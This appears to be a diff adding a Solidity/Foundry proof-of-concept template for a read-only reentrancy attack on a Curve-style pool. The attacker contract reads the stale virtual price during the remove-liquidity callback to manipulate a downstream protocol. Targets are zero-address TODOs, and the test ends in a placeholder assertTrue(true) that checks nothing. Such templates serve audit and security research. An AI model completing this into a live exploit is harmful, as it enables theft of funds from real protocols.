@@ -1,0 +1,77 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// Template: Curve/Balancer read-only reentrancy pattern.
+// Attacker triggers remove_liquidity → callback → reads stale virtual_price → manipulates downstream.
+
+import "forge-std/Test.sol";
+
+interface ICurvePool {
+    function remove_liquidity(uint256 amount, uint256[2] memory minAmounts) external;
+    function get_virtual_price() external view returns (uint256);
+    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external returns (uint256);
+}
+
+interface IConsumer {
+    // Protocol that reads virtual_price during reentrancy window
+    function deposit(uint256) external;
+    function getPrice() external view returns (uint256);
+}
+
+contract ReadOnlyReentrancyAttacker is Test {
+    ICurvePool public pool;
+    IConsumer public consumer;
+    bool public attacking;
+
+    constructor(address _pool, address _consumer) {
+        pool = ICurvePool(_pool);
+        consumer = IConsumer(_consumer);
+    }
+
+    function attack() external payable {
+        attacking = true;
+        pool.add_liquidity{value: msg.value}([msg.value, 0], 0);
+
+        uint256[2] memory minOuts;
+        pool.remove_liquidity(IERC20(address(pool)).balanceOf(address(this)), minOuts);
+
+        attacking = false;
+    }
+
+    receive() external payable {
+        if (attacking) {
+            // During remove_liquidity callback, pool state is mid-flight.
+            // virtual_price returns stale value.
+            uint256 stalePrice = pool.get_virtual_price();
+            console.log("Stale virtual_price:", stalePrice);
+            // Manipulate consumer using stale price
+            consumer.deposit(0);
+        }
+    }
+}
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+}
+
+contract ReadOnlyReentrancyTest is Test {
+    address constant CURVE_POOL = address(0); // TODO
+    address constant VULNERABLE_CONSUMER = address(0); // TODO
+    uint256 constant FORK_BLOCK = 0;
+
+    ReadOnlyReentrancyAttacker public attacker;
+
+    function setUp() public {
+        if (FORK_BLOCK > 0) {
+            vm.createSelectFork(vm.envString("RPC_URL"), FORK_BLOCK);
+        }
+        attacker = new ReadOnlyReentrancyAttacker(CURVE_POOL, VULNERABLE_CONSUMER);
+        vm.deal(address(attacker), 100 ether);
+    }
+
+    function test_Exploit_ReadOnlyReentrancy() public {
+        attacker.attack{value: 10 ether}();
+        // TODO: assert stale price was used; check consumer state
+        assertTrue(true, "PLACEHOLDER");
+    }
+}
